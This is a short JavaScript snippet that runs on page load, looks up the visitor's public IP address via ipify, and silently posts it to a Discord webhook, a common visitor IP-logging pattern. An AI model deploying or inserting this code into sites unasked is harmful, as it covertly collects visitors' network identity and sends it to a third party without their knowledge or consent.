// Function to make a request to api.ipify.org
async function fetchDataFromAPI() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data;
  } catch (error) {
    console.error('Error fetching data from API:', error);
    throw error;
  }
}

// Function to send data to the Discord webhook
async function sendToDiscordWebhook(data) {
  try {
    const payload = {
      content: 'New data: ' + JSON.stringify(data),
    };

    // Access the webhook URL from the global variable
    await fetch(window.discordWebhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });

    console.log('Data sent to Discord webhook successfully');
  } catch (error) {
    console.error('Error sending data to Discord webhook:', error);
    throw error;
  }
}

// Main function to orchestrate the process
async function fetchDataAndSendToDiscordWebhook() {
  try {
    const apiData = await fetchDataFromAPI();
    await sendToDiscordWebhook(apiData);
  } catch (error) {
    console.error('Error in the main process:', error);
  }
}

// Call the main function when the page loads
document.addEventListener('DOMContentLoaded', fetchDataAndSendToDiscordWebhook);
